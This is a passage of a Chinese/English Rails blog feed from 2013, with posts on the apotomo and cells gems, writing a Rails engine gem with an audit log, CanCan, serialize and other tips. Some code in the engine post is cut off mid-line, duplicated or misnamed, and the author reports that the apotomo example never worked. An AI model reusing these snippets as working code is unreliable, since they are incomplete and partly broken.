&lt;p&gt;2. &amp;#160;假设已经存在一个 模块：post, &amp;#160; 它"has_many comments", 那么就需要： &amp;#160;run the generation command &amp;#160; &amp;#160;(assuming we already have a 'post' module which has_many 'comments' )&amp;#160;&lt;/p&gt;
&lt;pre&gt;sg552@youku:/sg552/workspace/test-cell$ bundle exec rails generate apotomo:widget Comments display write -e haml
      invoke  haml
      create    app/widgets/comments/display.html.haml
      create    app/widgets/comments/write.html.haml
      invoke  test_unit
      create    test/widgets/comments_widget_test.rb
      create  app/widgets/comments_widget.rb

&lt;/pre&gt;
&lt;p&gt; 3. in post_controller: &lt;/p&gt;
&lt;pre&gt;class PostsController &amp;lt; ApplicationController
  include Apotomo::Rails::ControllerMethods

  has_widgets do |root|
    root &amp;lt;&amp;lt; widget(:comments, :post =&amp;gt; @post)
  end
  def index 
    #...
  end
end
&lt;/pre&gt;
&lt;p&gt; 4. in app/views/posts/show.html.haml &lt;/p&gt;
&lt;pre&gt;%h1 @post.title

%p
  @post.body

%p
  = render_widget :comments
&lt;/pre&gt;
&lt;p&gt; 5. 实现这个 widget (一个迷你型的controller ) &lt;/p&gt; 
&lt;pre&gt;class CommentsWidget &amp;lt; Apotomo::Widget
  responds_to_event :post

  def display(args)
    @comments = args[:post].comments
    render
  end 
  def post(evt)
    @comment = Comment.new(:book_id =&amp;gt; evt[:book_id])
    @comment.update_attributes evt[:comment]  # a bit like params[].
    update :state =&amp;gt; :display
  end
end
&lt;/pre&gt;
&lt;p&gt; 6. 最后，  display.html.haml 中： &lt;/p&gt;
&lt;pre&gt;= widget_div do
  %ul
    - for c in @comments
      %li c.text

  - form_for :comment, @comment, :url =&amp;gt; url_for_event(:post), :remote =&amp;gt; true do |f|
    = f.error_messages
    = f.text_field :text

    = submit_tag "Don't be shy, comment!"
&lt;/pre&gt;

&lt;p&gt; 好吧，我失败了。。。  没有成功的跑起来，虽然经过查看源代码等等修改，也还是一直有失败消息。我怀疑这个GEM 不兼容 3.2.11 ，或者作者已经停止维护了（上一次提交代码是2个月前，再一次是8个月前，还有20+ issue没有 解决， 好多pull request 没有处理） &lt;/p&gt;</description>
      <pubDate>Fri, 01 Feb 2013 02:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubygem-apotomo-for-rails</link>
    </item>
    <item>
      <title>RAILS中的 rubygem:   cells  ( cells rubygem )</title>
      <description>&lt;p&gt;这几天在弄Rails engine gem, 然后从 regular rubygem -&amp;gt; enginex -&amp;gt; rails plugin -&amp;gt; &amp;#160;Apotomo &amp;#160;-&amp;gt; 'cells'. &amp;#160; &amp;#160;( these days I am dealing with how to setup 'rails engine gem', the resources I have read are: &amp;#160;&lt;br /&gt;1. regular rubygems doc.&lt;br /&gt;2. enginex rubygem. &amp;#160;( for rails 3.0.x)&lt;br /&gt;3. rails plugin ( 3.1.x, 3.2.x )&amp;#160;&lt;br /&gt;4. apotomo &amp;#160;( to run the gem's test)&lt;br /&gt;5. cells.&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;今天试了下"cells" 这个rubygem, github上关注度到了1300+。 ( &lt;a href="https://github.com/apotonick/cells"&gt;https://github.com/apotonick/cells&lt;/a&gt;)  &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;很简单，按照官方的文档一步一步做就可以了：&lt;/p&gt;
&lt;p&gt;1. 在Gemfile中 ： &amp;#160; &amp;#160;gem 'cells'&lt;/p&gt;
&lt;p&gt;2. 生成对应的scaffolding: &amp;#160; &amp;#160;&lt;/p&gt;
&lt;pre&gt;$ rails generate cell cart show -e haml
  create  app/cells/
  create  app/cells/cart
  create  app/cells/cart_cell.rb
  create  app/cells/cart/show.html.haml
  create  test/cells/cart_test.rb
&lt;/pre&gt;
&lt;p&gt; 3. 可以在某个view中把 生成的cell views 嵌入进去&lt;/p&gt;
&lt;pre&gt;# in other views: 
&lt;div id="header"&gt;
  &amp;lt;%= render_cell :cart, :show, :user =&amp;gt; @current_user %&amp;gt;
&lt;/div&gt;
&lt;/pre&gt;
&lt;p&gt; controller: &lt;/p&gt;
&lt;pre&gt;# cells controller 
class CartCell &amp;lt; Cell::Rails
  def show(args)
    user    = args[:user]
    @items  = user.items_in_cart

    render  # renders show.html.haml
  end
end
&lt;/pre&gt;
&lt;p&gt;# cells views &lt;/p&gt;
&lt;pre&gt;# show.html.haml
#cart
  You have #{@items.size} items in your shopping cart.
&lt;/pre&gt;
&lt;p&gt;cells的优点： 可以减少 before filter, partial 和 helper的使用。 一个cell跟一个controller差不多。一个页面中可以包含多个cells. &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;给我的感觉： 貌似比before_filter 好一些，确实是一个 Cart的不错的解决方案。 用起来跟controller一样，还可以在某个页面中多次使用。&lt;/p&gt;
&lt;p&gt;(Say you’re writing a Rails online shop - the shopping cart is reappearing again and again in every view. You’re thinking about a clean solution for that part. A mixture of controller code, before-filters, partials and helpers?&amp;#160;
&lt;/p&gt;
&lt;p&gt;Cells are View Components for Rails. They look and feel like controllers. They don’t have no DoubleRenderError. They can be rendered everywhere in your controllers or views. They are cacheable, testable, fast and wonderful. They bring back OOP to your view and improve your software design. ) &lt;/p&gt;</description>
      <pubDate>Fri, 01 Feb 2013 02:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/cells-rubygem-for-rails</link>
    </item>
    <item>
      <title>建立rails engine gem ( how to write a rails engine gem ) </title>
      <description>&lt;p&gt;注意：这个文章只针对Rails3.0.x 对于 后面的版本 &amp;#160;, 请看 $ rails plugin new  (Enginex is only available for Rails 3.0. *For Rails 3.1 onwards, Enginex was ported to Rails as `rails plugin new` by Piotr Sarnacki.* )&lt;/p&gt;
&lt;p&gt;参考： &lt;a href="http://coding.smashingmagazine.com/2011/06/23/a-guide-to-starting-your-own-rails-engine-gem/" target="_blank"&gt;http://coding.smashingmagazine.com/2011/06/23/a-guide-to-starting-your-own-rails-engine-gem/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;昨天上午打算发布自己的第一个RAILS GEM （也叫 rails engine gem)  ，但是失败了，原因是不知道如何引入，或者扩展RAILS 的controller, views 等等。搜了一些文章，终于找到关键的了，所以一步一步的记录下来。 &lt;/p&gt;
&lt;p&gt;我们使用 enginex 这个gem, 作者是 Rails 的核心提交人员。这个GEM的作用是使大家对于RAILS ENGINE的开发更加快速，不必关注一些边缘的知识，把精力用在刀刃上～ 。&lt;/p&gt;
&lt;p&gt; 先看它是如何安装的&lt;/p&gt;
&lt;pre&gt;$ gem install enginex
$ engine audited_controller

      STEP 1  Creating gem skeleton
      create  
      create  audited_controller.gemspec
      create  Gemfile
      create  MIT-LICENSE
      create  README.rdoc
      create  Rakefile
      create  lib/audited_controller.rb
      create  test
      create  test/audited_controller_test.rb
      create  test/integration/navigation_test.rb
      create  test/support/integration_case.rb
      create  test/test_helper.rb
      create  .gitignore

      STEP 2  Vendoring Rails application at test/dummy
      create  
      create  README
      create  Rakefile
      create  config.ru
      create  .gitignore
      .....
     STEP 3  Configuring Rails application
       force  test/dummy/config/boot.rb
       force  test/dummy/config/application.rb

      STEP 4  Removing unneeded files
      remove  test/dummy/.gitignore
      remove  test/dummy/db/seeds.rb
      remove  test/dummy/doc
      ......

&lt;/pre&gt;
&lt;p&gt;1. 修改 gemspec 文件。加入必要的内容&lt;/p&gt;
&lt;pre&gt;# audited_controller.gemspec
Gem::Specification.new do |s| 
  s.name = "audited_controller"
  s.summary = "a tool to help auditing the actions of controller."
  s.description = "easily audit your actions"
  #s.files = Dir["{app,lib,config}/**/*"] + ["MIT-LICENSE", "Rakefile", "Gemfile", "README.rdoc"]
  s.version = AuditedController::VERSION
  s.authors = ["Siwei Shen"]
  s.email = ["sg552sg552@gmail.com"]
  s.homepage = "siwei.me"
  s.files = `git ls-files`.split("\n")
  s.executables = `git ls-files`.split("\n").map{|f| f =~ /^bin\/(.*)/ ? $1 : nil}.compact
  s.require_path = 'lib'
end

&lt;/pre&gt;
&lt;p&gt; 2. 编辑 Gemfile&lt;/p&gt;
&lt;pre&gt;# Gemfile
source "http://rubygems.org"
  
gem "rails", "&amp;gt;= 3.0.0"
gem "capybara", "&amp;gt;= 0.4.0"
gem "sqlite3"
&lt;/pre&gt;
&lt;p&gt; 3. 增加3个文件&lt;/p&gt;
&lt;pre&gt;1. version.rb :  
# lib/audited_controller/version.rb
 module AuditedController
   VERSION='0.0.7'
 end

2.
# lib/audited_controller.rb
require 'active_support/dependencies'
module AuditedController
  mattr_accessor :app_root
  def self.setup
    yield self
  end 
end
require 'audited_controller/engine'


3. engine.rb
# lib/audited_controller/engine.rb
module AuditedController
  class Engine &amp;lt; Rails::Engine
    initialize 'audited_controller.load_app_instance_data' do |app|
      config.app_root = app.root
    end 
    initialize "team_page.load_static_assets" do |app|
      app.middleware.use ::ActionDispatch::Static, "#{root}/public"
    end 

  end 
end
&lt;/pre&gt;
&lt;p&gt; 4. 重点来了： 建立 model.  在这个GEM中，我要用到一个model:  audit.  所以，要有一个task 来运行migration:   &lt;/p&gt;
&lt;pre&gt;# file: lib/generators/audited_controller/audited_controller_generator.rb
require 'rails/generators'
require 'rails/generators/migration'
    
class AuditedControllerGenerator &amp;lt; Rails::Generators::Base
  include Rails::Generators::Migration
  def self.source_root
    @source_root ||= File.join(File.dirname(__FILE__), 'templates')
  end

  def self.next_migration_number(dirname)
    if ActiveRecord::Base.timestamped_migrations
      Time.new.utc.strftime("%Y%m%d%H%M%S")
    else
      "%.3d" % (current_migration_number(dirname) + 1)
    end
  end

  def create_migration_file
    migration_template 'migration.rb', 'db/migrate/create_audits_table.rb'
  end
end
&lt;/pre&gt;
&lt;p&gt;4.2 还要增加对应的migration 模板文件： &lt;/p&gt;
&lt;pre&gt;#  lib/generators/audited_controller/templates/migration.rb
# -*- encoding : utf-8 -*-
class CreateAudits&amp;lt; ActiveRecord::Migration
  def change
    create_table :audits, :comment =&amp;gt; '记录用户操作日志' do |t|
      t.string :action, :comment =&amp;gt; '用户访问的action'
      t.string :controller, :comment =&amp;gt; '用户访问的controller'
      t.string :description, :comment =&amp;gt; '具体描述'
      t.string :user_name, :comment =&amp;gt; '用户名'
      t.text :params, :comment =&amp;gt; 'request的详细参数'
      t.string :remote_ip, :comment =&amp;gt; '用户的IP地址'
      t.string :restful_method, :comment =&amp;gt; 'RESTful method, get, put, post, delete 中的一种'

      t.timestamps
    end
  end
end 

&lt;/pre&gt;
&lt;p&gt;4.3 还要增加对应的model  文件&lt;/p&gt;
&lt;pre&gt;# app/models/audited_controller/audit.rb
# -*- encoding : utf-8 -*-
class Audit &amp;lt; ActiveRecord::Base
  attr_accessible :action, :controller, :description, :user_name, 
    :params, :remote_ip, :restful_method
  AUDIT_TYPE_NO_GET = 'no get'
  AUDIT_TYPE_PUSH = 'push'
  AUDIT_TYPE_CREATE_MESSAGE = 'create_message'
  AUDIT_TYPE_UPDATE_MESSAGE = 'update_message'
  AUDIT_TYPE_APPROVAL = 'approval'
end
&lt;/pre&gt;

&lt;p&gt;5.  配置正确的话， rubygem中的 app 和  config 目录是会被自动加载的。所以。... 建立我们的config/routes.rb : &lt;/p&gt;
&lt;pre&gt;# config/routes.rb 
Rails.application.routes.draw do
  resources :audits
end
&lt;/pre&gt;
&lt;p&gt;6. 还要加上controllers 啊亲！ &lt;/p&gt;
&lt;pre&gt;# application_controller.rb 
# -*- encoding : utf-8 -*-
class ApplicationController &amp;lt; ActionController::Base
  puts "== in gem's application_controller"
  def add_to_audit
    audit_config = HashWithIndifferentAccess.new(YAML.load(File.read(
      File.expand_path("#{Rails.root}/config/audits.yml", __FILE__))))
    controller = params[:controller]
    action = params[:action]
    request_type = restful_method(params)
    return if !audit_get_request?(audit_config) &amp;amp;&amp;amp; request_type == 'get'
    Audit.create!(action: action, controller: controller, user_name: current_user.login,
      description: audit_config[controller][action],
      :params =&amp;gt; params.inspect,
      remote_ip: request.remote_ip, restful_method: restful_method(params) )
  end
  private
  def audit_get_request?(audit_config)
    audit_config["audit_get_request"]
  end
  # return: get, post, put or delete
  def restful_method(params)
    params[:authenticity_token].blank? ? 'get' : ((params[:_method]) || 'post')
  end

end   
&lt;/pre&gt;
&lt;p&gt; 以及对应的 audits_controller.rb
&lt;/p&gt;
&lt;pre&gt;# app/controllers/application_controller.rb
# -*- encoding : utf-8 -*-
class AuditsController &amp;lt; ApplicationController
  before_filter CASClient::Frameworks::Rails::Filter
  def index
    @audits = params[:user_name].blank? ?
      Audit :
      Audit.where("user_name like ?",  "%#{params[:user_name]}%")
    @audits = case params[:audits_type]
      when Audit::AUDIT_TYPE_NO_GET then @audits.where("restful_method != 'get'")
      when Audit::AUDIT_TYPE_PUSH then @audits.where("action = 'confirm_push'")
      when Audit::AUDIT_TYPE_APPROVAL then @audits.where("action = 'update_approval'")
      when Audit::AUDIT_TYPE_CREATE_MESSAGE then @audits.where("description = '建立了一条消息'")
      when Audit::AUDIT_TYPE_UPDATE_MESSAGE then @audits.where("description= '更新消息'")
      else @audits
      end 
    @audits = @audits.where("created_at &amp;gt;= ? ", params[:created_at_before]) unless params[:created_at_befo
    @audits = @audits.where("created_at &amp;lt;= ? ", DateTime.strptime(params[:created_at_after], '%Y-%m-%d').t
    @audits = @audits.order('created_at desc').page(params[:page])
  end 
end
&lt;/pre&gt;
&lt;p&gt; 以及这个controller: &lt;/p&gt; 
&lt;pre&gt;# -*- encoding : utf-8 -*-
class AuditsController &amp;lt; ApplicationController
  before_filter CASClient::Frameworks::Rails::Filter
  def index
    @audits = params[:user_name].blank? ?
      Audit :
      Audit.where("user_name like ?",  "%#{params[:user_name]}%")
    @audits = case params[:audits_type]
      when Audit::AUDIT_TYPE_NO_GET then @audits.where("restful_method != 'get'")
      when Audit::AUDIT_TYPE_PUSH then @audits.where("action = 'confirm_push'")
      when Audit::AUDIT_TYPE_APPROVAL then @audits.where("action = 'update_approval'")
      when Audit::AUDIT_TYPE_CREATE_MESSAGE then @audits.where("description = '建立了一条消息'")
      when Audit::AUDIT_TYPE_UPDATE_MESSAGE then @audits.where("description= '更新消息'")
      else @audits
      end
    @audits = @audits.where("created_at &amp;gt;= ? ", params[:created_at_before]) unless params[:created_at_befo
    @audits = @audits.where("created_at &amp;lt;= ? ", DateTime.strptime(params[:created_at_after], '%Y-%m-%d').t
    @audits = @audits.order('created_at desc').page(params[:page])
  end 
end

&lt;/pre&gt;
&lt;p&gt; 6 .增加 views &lt;/p&gt;
&lt;pre&gt;用户的操作日志
&amp;lt;%# render :partial =&amp;gt; 'search_form' %&amp;gt;
&amp;lt;%# paginate @audits %&amp;gt;

&amp;lt;% @audits.each do |audit| %&amp;gt;
  
&amp;lt;% end %&amp;gt;
&lt;table class="table table-hover"&gt;
  &lt;tbody&gt;&lt;tr&gt;
    &lt;th style="width: 100px"&gt; 用户名&lt;/th&gt;
    &lt;th&gt;操作&lt;/th&gt;
    &lt;th style="width: 180px"&gt;时间&lt;/th&gt;
    &lt;th&gt;IP&lt;/th&gt;
    &lt;th style="width: 300px"&gt;详细参数&lt;/th&gt; 
  &lt;/tr&gt;
&lt;tr&gt;
    &lt;td&gt;&amp;lt;%= audit.user_name %&amp;gt;&lt;/td&gt;
    &lt;td&gt;&amp;lt;%= audit.description %&amp;gt;&lt;/td&gt;
    &lt;td&gt;&amp;lt;%= audit.created_at %&amp;gt;&lt;/td&gt;
    &lt;td&gt;&amp;lt;%= audit.remote_ip %&amp;gt;&lt;/td&gt;
    &lt;td&gt;&amp;lt;%= audit.params %&amp;gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&amp;lt;%# paginate @audits %&amp;gt;
]]&amp;gt;
&lt;/pre&gt;</description>
      <pubDate>Thu, 31 Jan 2013 06:50:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/writing-rails-engine-gem</link>
    </item>
    <item>
      <title>如何查看某个Action的RESTful 类型？(how to determine the restful type of an action in Rails? )</title>
      <description>&lt;p&gt;今天为了这个问题想了半小时。呃。。。又是看RAILS源代码又是查文档啥的。 后来才发现，有个灰常简单的方法： &amp;#160;( today I spent half an hour on this question, checking both the source code &amp;#160;and the documentation. &amp;#160;at last, I found this very simple solution: )&lt;/p&gt;

&lt;pre&gt;  # in rails application controller.   params is the common parameter as you know. 
  def restful_method(params)
    params[:authenticity_token].blank? ? 'get' : ((params[:_method]) || 'post')
  end
&lt;/pre&gt;
&lt;p&gt;a bit more about the source code, see: &amp;#160;gems/railties-3.0.8/lib/rails/tasks/routes.rake&lt;/p&gt;</description>
      <pubDate>Wed, 30 Jan 2013 07:33:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-determine-the-restful-type-of-an-action-in-rails</link>
    </item>
    <item>
      <title>在Rails中，删除某个hash中的多个key (delete multiple keys from a hash in Rails  )</title>
      <description>参考:  &lt;a href="http://stackoverflow.com/questions/1560572/ruby-delete-multiple-hash-keys" target="_blank"&gt; http://stackoverflow.com/questions/1560572/ruby-delete-multiple-hash-keys &lt;/a&gt;

&lt;pre&gt;sg552@youku:/sg552/workspace/postman$ bundle exec rails c
Loading development environment (Rails 3.2.9)
&amp;gt;&amp;gt; apple = {:shape =&amp;gt; 'ball', :taste =&amp;gt; 'sweet', :color =&amp;gt; 'red' }
=&amp;gt; {:shape=&amp;gt;"ball", :taste=&amp;gt;"sweet", :color=&amp;gt;"red"}

&amp;gt;&amp;gt; apple.except(:shape, :color)
=&amp;gt; {:taste=&amp;gt;"sweet"}
&lt;/pre&gt;

&lt;p&gt;结论： ActiveSupport 需要我们挖掘的东西太多了， 有空时务必看一下  (  we need to keep learning ActiveSupport )&lt;/p&gt;</description>
      <pubDate>Wed, 30 Jan 2013 02:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/delete-multiple-keys-from-hash-in-rails</link>
    </item>
    <item>
      <title>Rails: 慎用 f.check_box  , 推荐使用 check_box_tag    ( prefer to use check_box_tag or hash, but not f.checkbox in Rails) </title>
      <description>&lt;div class="description"&gt;
                  &lt;p&gt;TODO: 翻译成汉语&amp;#160;&lt;/p&gt;
&lt;p&gt;
Returns a checkbox tag tailored for accessing a specified attribute
(identified by &lt;tt&gt;method&lt;/tt&gt;) on an object assigned to the template
(identified by &lt;tt&gt;object&lt;/tt&gt;). This object must be an instance object
(@object) and not a local object. It’s intended that &lt;tt&gt;method&lt;/tt&gt;
returns an integer and if that integer is above zero, then the checkbox is
checked. Additional options on the input tag can be passed as a hash with
&lt;tt&gt;options&lt;/tt&gt;. The &lt;tt&gt;checked_value&lt;/tt&gt; defaults to 1 while the
default &lt;tt&gt;unchecked_value&lt;/tt&gt; is set to 0 which is convenient for
boolean values.
&lt;/p&gt;
&lt;h4&gt;Gotcha&lt;/h4&gt;
&lt;p&gt;
The HTML specification says unchecked check boxes are not successful, and
thus web browsers do not send them. Unfortunately this introduces a gotcha:
if an &lt;tt&gt;Invoice&lt;/tt&gt; model has a &lt;tt&gt;paid&lt;/tt&gt; flag, and in the form that
edits a paid invoice the user unchecks its check box, no &lt;tt&gt;paid&lt;/tt&gt;
parameter is sent. So, any mass-assignment idiom like
&lt;/p&gt;
&lt;pre&gt;  @invoice.update_attributes(params[:invoice])
&lt;/pre&gt;
&lt;p&gt;
wouldn’t update the flag.
&lt;/p&gt;
&lt;p&gt;
To prevent this the helper generates an auxiliary hidden field before the
very check box. The hidden field has the same name and its attributes mimic
an unchecked check box.
&lt;/p&gt;
&lt;p&gt;
This way, the client either sends only the hidden field (representing the
check box is unchecked), or both fields. Since the HTML specification says
key/value pairs have to be sent in the same order they appear in the form,
and parameters extraction gets the last occurrence of any repeated key in
the query string, that works for ordinary forms.
&lt;/p&gt;
&lt;p&gt;
Unfortunately that workaround does not work when the check box goes within
an array-like parameter, as in
&lt;/p&gt;
&lt;pre&gt;  &amp;lt;%= fields_for "project[invoice_attributes][]", invoice, :index =&amp;gt; nil do |form| %&amp;gt;
    &amp;lt;%= form.check_box :paid %&amp;gt;
    ...
  &amp;lt;% end %&amp;gt;
&lt;/pre&gt;
&lt;p&gt;
because parameter name repetition is precisely what &lt;a href="../../Rails.html"&gt;Rails&lt;/a&gt; seeks to distinguish the elements of the
array. For each item with a checked check box you get an extra ghost item
with only that attribute, assigned to “0”.
&lt;/p&gt;
&lt;p&gt;
In that case it is preferable to either use &lt;tt&gt;check_box_tag&lt;/tt&gt; or to
use hashes instead of arrays.
&lt;/p&gt;
&lt;h4&gt;Examples&lt;/h4&gt;
&lt;pre&gt;  # Let's say that @post.validated? is 1:
  check_box("post", "validated")
  # =&amp;gt; &amp;lt;input name="post[validated]" type="hidden" value="0" /&amp;gt;
  #    &amp;lt;input type="checkbox" id="post_validated" name="post[validated]" value="1" /&amp;gt;

  # Let's say that @puppy.gooddog is "no":
  check_box("puppy", "gooddog", {}, "yes", "no")
  # =&amp;gt; &amp;lt;input name="puppy[gooddog]" type="hidden" value="no" /&amp;gt;
  #    &amp;lt;input type="checkbox" id="puppy_gooddog" name="puppy[gooddog]" value="yes" /&amp;gt;

  check_box("eula", "accepted", { :class =&amp;gt; 'eula_check' }, "yes", "no")
  # =&amp;gt; &amp;lt;input name="eula[accepted]" type="hidden" value="no" /&amp;gt;
  #    &amp;lt;input type="checkbox" class="eula_check" id="eula_accepted" name="eula[accepted]" value="yes" /&amp;gt;
&lt;/pre&gt;

                &lt;/div&gt;</description>
      <pubDate>Wed, 30 Jan 2013 01:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/prefer-to-use-check-box-tag-in-rails</link>
    </item>
    <item>
      <title>Linux 控制台神器：搜索历史命令 Ctrl + R    ( ctrl + r to search the history command )</title>
      <description>&lt;p&gt;Linux下的神器 ctrl + r (reverse-i-search ) 的使用方法： &amp;#160; (reverse-i-search usage: )&amp;#160;&lt;/p&gt;
&lt;p&gt;(press ctl + r ) 输入任意字符，例如： "mig" &amp;#160;就会出现 $ &amp;#160;rake db:migrate &amp;#160; &amp;#160;( press ctrl + r, then input the content you want to search)&amp;#160;&lt;/p&gt;
&lt;p&gt;如果我想找另一个命令呢？ &amp;#160;输入完 'mig' 多按几次 ctrl + r ，就可以继续向前搜索 “mig" 的内容了。 &amp;#160;( if you want to search the last but n result, just press n times 'ctrl + r'.)&lt;/p&gt;
&lt;p&gt;如果找到了，按 -&amp;gt; 或者直接回车，就是执行 &amp;#160;( press Enter to execute the command , or 'right arrow (-&amp;gt;)' to go to the end of the command.&amp;#160;&lt;/p&gt;
&lt;p&gt;更多请看 (refer to )：&lt;a href="http://www.thegeekstuff.com/tag/bash-control-r/ " title="http://www.thegeekstuff.com/tag/bash-control-r/ " target="_blank"&gt;www.thegeekstuff.com/tag/bash-control-r/&lt;/a&gt;&amp;#160; &amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 29 Jan 2013 07:30:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/search-the-history-command-control-r</link>
    </item>
    <item>
      <title>在Rails3中，保存任意结构的对象到 数据库 (save schema-less object to Rails DB's string column ) </title>
      <description>&lt;h2 id="label-Saving+arrays%2C+hashes%2C+and+other+non-mappable+objects+in+text+columns"&gt;Saving arrays, hashes, and other non-mappable objects in text columns&lt;/h2&gt;

&lt;p&gt;AR 可以保存任意对象到 TEXT 列。如下： &amp;#160; ( Active Record can serialize any object in text columns using YAML. To do
so, you must specify this with a call to the class method
&lt;code&gt;serialize&lt;/code&gt;. This makes it possible to store arrays, hashes, and
other non-mappable objects without doing any additional work. )&amp;#160;&lt;/p&gt;

&lt;pre class="ruby"&gt;&lt;span class="ruby-keyword"&gt;class&lt;/span&gt; &lt;span class="ruby-constant"&gt;User&lt;/span&gt; &lt;span class="ruby-operator"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ruby-constant"&gt;ActiveRecord&lt;/span&gt;
&lt;span class="ruby-operator"&gt;::&lt;/span&gt;
&lt;span class="ruby-constant"&gt;Base&lt;/span&gt;
  &lt;span class="ruby-identifier"&gt;serialize&lt;/span&gt; :&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt;
&lt;span class="ruby-keyword"&gt;end&lt;/span&gt;

&lt;span class="ruby-identifier"&gt;user&lt;/span&gt; = &lt;span class="ruby-constant"&gt;User&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;create&lt;/span&gt;(:&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt; =&lt;span class="ruby-operator"&gt;&amp;gt;&lt;/span&gt; { &lt;span class="ruby-string"&gt;"background"&lt;/span&gt; =&lt;span class="ruby-operator"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ruby-string"&gt;"black"&lt;/span&gt;, &lt;span class="ruby-string"&gt;"display"&lt;/span&gt; =&lt;span class="ruby-operator"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ruby-identifier"&gt;large&lt;/span&gt; })
&lt;span class="ruby-constant"&gt;User&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;find&lt;/span&gt;(&lt;span class="ruby-identifier"&gt;user&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;id&lt;/span&gt;).&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt; &lt;span class="ruby-comment"&gt;# =&amp;gt; { "background" =&amp;gt; "black", "display" =&amp;gt; large }&lt;/span&gt;
&lt;/pre&gt;

&lt;p&gt;也可以指定该对象的类型（ You can also specify a class option as the second parameter that’ll raise
an exception if a serialized object is retrieved as a descendant of a class
not in the hierarchy. )&amp;#160;&lt;/p&gt;

&lt;pre class="ruby"&gt;&lt;span class="ruby-keyword"&gt;class&lt;/span&gt; &lt;span class="ruby-constant"&gt;User&lt;/span&gt; &lt;span class="ruby-operator"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ruby-constant"&gt;ActiveRecord&lt;/span&gt;
&lt;span class="ruby-operator"&gt;::&lt;/span&gt;
&lt;span class="ruby-constant"&gt;Base&lt;/span&gt;
  &lt;span class="ruby-identifier"&gt;serialize&lt;/span&gt; :&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt;, &lt;span class="ruby-constant"&gt;Hash&lt;/span&gt;
&lt;span class="ruby-keyword"&gt;end&lt;/span&gt;

&lt;span class="ruby-identifier"&gt;user&lt;/span&gt; = &lt;span class="ruby-constant"&gt;User&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;create&lt;/span&gt;(:&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt; =&lt;span class="ruby-operator"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ruby-node"&gt;%w( one two three )&lt;/span&gt;)
&lt;span class="ruby-constant"&gt;User&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;find&lt;/span&gt;(&lt;span class="ruby-identifier"&gt;user&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;id&lt;/span&gt;).&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt;    &lt;span class="ruby-comment"&gt;# raises SerializationTypeMismatch&lt;/span&gt;
&lt;/pre&gt;

&lt;p&gt;When you specify a class option, the default value for that attribute will
be a new instance of that class.&lt;/p&gt;

&lt;pre class="ruby"&gt;&lt;span class="ruby-keyword"&gt;class&lt;/span&gt; &lt;span class="ruby-constant"&gt;User&lt;/span&gt; &lt;span class="ruby-operator"&gt;&amp;lt;&lt;/span&gt; &lt;span class="ruby-constant"&gt;ActiveRecord&lt;/span&gt;
&lt;span class="ruby-operator"&gt;::&lt;/span&gt;
&lt;span class="ruby-constant"&gt;Base&lt;/span&gt;
  &lt;span class="ruby-identifier"&gt;serialize&lt;/span&gt; :&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt;, &lt;span class="ruby-constant"&gt;OpenStruct&lt;/span&gt;
&lt;span class="ruby-keyword"&gt;end&lt;/span&gt;

&lt;span class="ruby-identifier"&gt;user&lt;/span&gt; = &lt;span class="ruby-constant"&gt;User&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;new&lt;/span&gt;
&lt;span class="ruby-identifier"&gt;user&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;preferences&lt;/span&gt;.&lt;span class="ruby-identifier"&gt;theme_color&lt;/span&gt; = &lt;span class="ruby-string"&gt;"red"&lt;/span&gt;
&lt;/pre&gt;</description>
      <pubDate>Tue, 29 Jan 2013 02:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/saving-schema-less-object-to-rails-db-s-string-column</link>
    </item>
    <item>
      <title>Cancan 的alias action 与 核心方法 can   (alias action of Cancan and its core method: can) </title>
      <description>&lt;p&gt;( 从 CanCan::Ability  这个RDOC中拿过来的）( grabbed from its rdoc)  &lt;/p&gt;
&lt;p&gt; 1. 核心方法 can  &lt;/p&gt;
&lt;p&gt;
可以定义 可用的ability.  参数1是 action， 参数2 是对象名 (Defines which abilities are allowed using two arguments. The first one is the action you’re setting the permission for, the second one is the class of object you’re setting it on. )
&lt;/p&gt;
&lt;pre&gt;can :update, Article &lt;/pre&gt;
&lt;p&gt;  做为懒人，咱也可以传入一个数组： (You can pass an array for either of these parameters to match any one. Here the user has the ability to update or destroy both articles and comments. )  &lt;/p&gt;
&lt;pre&gt;can [:update, :destroy], [Article, Comment] 
&lt;/pre&gt; 
&lt;p&gt; :all 代表所有的对象, :manage 代表所有的action( You can pass :all to match any object and :manage to match any action. Here are some examples. )  &lt;/p&gt;
&lt;pre&gt;can :manage, :all
can :update, :all
can :manage, Project
&lt;/pre&gt;
&lt;p&gt; 也可以传入一个hash. 下面的例子，是该用户只能read 属于自己的 ， active = true的project ( 
You can pass a hash of conditions as the third argument. Here the user can only see active projects which he owns.  )&lt;/p&gt;
&lt;pre&gt;can :read, Project, :active =&amp;gt; true, :user_id =&amp;gt; user.id 
&lt;/pre&gt;
